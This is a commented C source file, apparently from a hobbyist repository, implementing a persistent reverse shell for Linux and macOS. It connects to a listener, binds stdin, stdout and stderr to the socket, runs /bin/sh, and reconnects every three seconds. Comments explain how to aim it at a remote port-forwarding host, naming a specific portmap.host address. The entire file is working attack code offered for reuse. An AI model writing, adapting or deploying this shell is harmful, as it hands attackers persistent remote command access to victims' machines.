#include <sys/socket.h> // connect() 
#include <string.h> // memset()
#include <arpa/inet.h> // htons(), indet_addr()
#include <unistd.h> // execve(), close()
#include <sys/wait.h> // wait()
// #include <netdb.h> // for port forwarding use gethostbyname() or getaddrinfo() according to device.

struct sockaddr_mine{  // connect() function asks for a struct so we make struct of data that is required in order to connect,
unsigned short fam; // what to use eg: ipv4, v6 or else,
unsigned short port; // which port to use,
unsigned int ip; // which ip/host to connect,
char padding[8]; // this padding is to ensure the custom structure is the same size as the generic, system-defined struct sockaddr in connect() function so no size difference/errors comes,
}; // and later we will pass it to connect() after putting values in it in main():

int main(void){ // void means take no arguments form command line eg: ./executable <arg> <arg2>...
while(1){
int sockhndl = socket(2, 1, 0); // 2 is AF_INET and 1 is SOCK_STREAM (TCP) and 0 is default of tcp somethin like that..
//sockhndl is a var to store pid/handle_id which is in intiger or simply a 4-5 digit number that denotes the socket created up earlier using socket() given to us by os/kernel to play around with socket using it.
//after requesting kernel to create a socket uisng socket(of ipv4 and tcp) then we store handle to a variable we can use that variable to represent our created socket and to actually use it to connect(), send(), receive(), and more...
struct sockaddr_mine data; // defining sockaddr_mine as data to use inside main()
memset(&data, 0, sizeof(data)); // Initializing memory to 0 so if any junk was there wipes off and becomes ready to talke our data.
data.fam = AF_INET; // giving our socket family as ipv4 (AF_INET)
data.port = htons(1337); // providing port and htons() converts port to network byte order as required (in hex)
data.ip = inet_addr("127.0.0.1"); // converting ip to network byte order as required (again in hex) then putting it in ip of data struct.
/*
The current code works on UNIX basically linux and mac but if only in localhost because if you want to use port fordarding. then,

  for linux you #include <netdb.h> and do
  struct hostent *host = gethostbyname("yourhost.somein");
  data.ip = ((struct in_addr *)host->h_addr_list[0])->s_addr;
  and you are good to go...

   for mac os you use #include <netdb.h> but,
    is different you have to use:
    struct addrinfo hints, res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; // Use IPv4
    hints.ai_socktype = SOCK_STREAM; // TCP socket
    now you give em all to: get addrinfo():
    getaddrinfo("TheGreen-48920.portmap.host", NULL, &hints, &res);
    after that copy the resolved IP address from getaddrinfo:
    struct sockaddr_insa_in = (struct sockaddr_in ) res->ai_addr;
    data.ip = sa_in->sin_addr.s_addr;

  Also you have other options to make your own resolver or use other headers...
*/
if(connect(sockhndl, (struct sockaddr*)&data, sizeof(data)) == 0){ // connect () takes our struct, a pack of data and connects us to one listerning in that ip and port as we defined if there is no listerner active it exits immediately.

if(fork() == 0){ // fork to create child process and run our shell from there so if it breaks it will be catched by wait()
  dup2(sockhndl, 0); // stdin to socket
  dup2(sockhndl, 1); //stdout  "   "
  dup2(sockhndl, 2); // stderror "  "

  char *argv[] = {"/bin/sh", NULL}; // argv is required in execve() for some reason so we make that and pass it in execve()
  execve("/bin/sh", argv, NULL); // for mac os use zsh for making g one its is in /bin/zsh prefer to spawn this cuz its mac default one but there is sh and bash also.
}
  close(sockhndl); // after execve() exits for some reason close the handle
  wait(NULL); // wait 4 child to exit after socket handle closed
}
  sleep(3); // after 3 seconds again sends connect() request until re-connected so it becomes a presistence reverse shell...
}
  return 0; // if everythign fails exits if code touches here somehow breaking while loop return is used to break function like break; for loops if this not given still compiles but compiler complains...
}
// i guess i tryed to explan as much as i knew hover whoever is reading have liked it and don't forget to leave a star or do something in repo to help/appreciate...
